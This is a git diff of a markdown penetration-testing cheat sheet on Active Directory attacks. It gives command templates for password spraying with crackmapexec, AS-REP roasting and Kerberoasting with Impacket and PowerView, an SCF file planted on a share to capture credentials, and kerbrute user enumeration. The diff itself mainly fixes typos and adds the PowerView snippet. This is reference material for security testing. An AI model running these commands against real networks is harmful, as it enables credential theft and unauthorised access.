@@ -1,8 +1,8 @@
 ## Miscellaneous Attacks In No Particular Order
 
-*+Password Spraying With CrackMapExec**
+**Password Spraying With CrackMapExec**
 
-When You have a working password and a list of userames, or a working username and a list of passwords, ``crackmapexec`` makes testing your credentials trivial. ``crackmapexec`` has a few protocols available. The one's that I find the most use out of is ``smb``, ``ldap``, and ``winrm``.
+When You have a working password and a list of userames, or a working username and a list of passwords, ``crackmapexec`` makes testing your credentials trivial. ``crackmapexec`` has a few protocols available. 
 ```bash
 # Test 1 Password with a list of Usernames
 crackmapexec <PROTOCOL> <IP> -u <USERLIST> -p '<PASS>' --continue-on-success
@@ -27,7 +27,7 @@ python3 GetNPUsers.py <DOMAIN>/ -dc-ip <IP> -no-pass -usersfile <USERLIST>
 - [Roasting AS-REPS](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
 - [AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
-**Kerberoasting**
+## Kerberoasting
 
 Kerberoasting is a method for extracting service account credentials from Active Directory as a notmal user. Again, [AD Security](https://adsecurity.org/) has an insane amount of content that goes in depth to what this is, how it works, and when to use it. I won't even bother going into the detail's of the attack here, but articles from them are linked below.
 
@@ -42,13 +42,20 @@ python3 GetUserSPNs.py -request -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -save -output
 python3 GetUserSPNs.py -request -dc-ip <IP> -hashes <LM_HASH>:<NT_HASH> <DOMAIN>/<USER> -save -outputfile hashes.txt
 ```
 
+You can also use the PowerView function if you already have a shell.
+
+```powershell
+Import-Module .\PowerView.ps1
+Invoke-Kerberoast
+```
+
 - [Cracking Kerberos TGS Tickets Using Kerberoast](https://adsecurity.org/?p=2293)
 - [Dectecting Kerboasting Activity](https://adsecurity.org/?p=3458)
 - [Kerberos Overview](https://adsecurity.org/?p=227)
 
 **SCF File Attack**
 
-An SCF *(Shell Command File)* can be used to access an attacker's UNC path. Planted inside a nwtwork share, when a user opens the ``scf`` file, Windows automatically authenicates to the server the UNC is pointing to, using the current user's credentials. We can use ``responder`` or somthing similar to harvest these credentials and crack them offline.
+An SCF *(Shell Command File)* can be used to access an attacker's UNC path. Planted inside a network share, when a user opens the ``scf`` file, Windows automatically authenticates to the server the UNC is pointing to, using the current user's credentials. We can use ``responder`` or something similar to harvest these credentials and crack them offline.
 
 1) Inside a ``.scf`` file put:
 
@@ -93,3 +100,4 @@ Enumerate valid usernames using ``kerbrute``. This requires Kerberos to the open
 ```bash
 kerbrute userenum -d <DOMAIN> --dc <IP> <USERLIST>
 ```
+
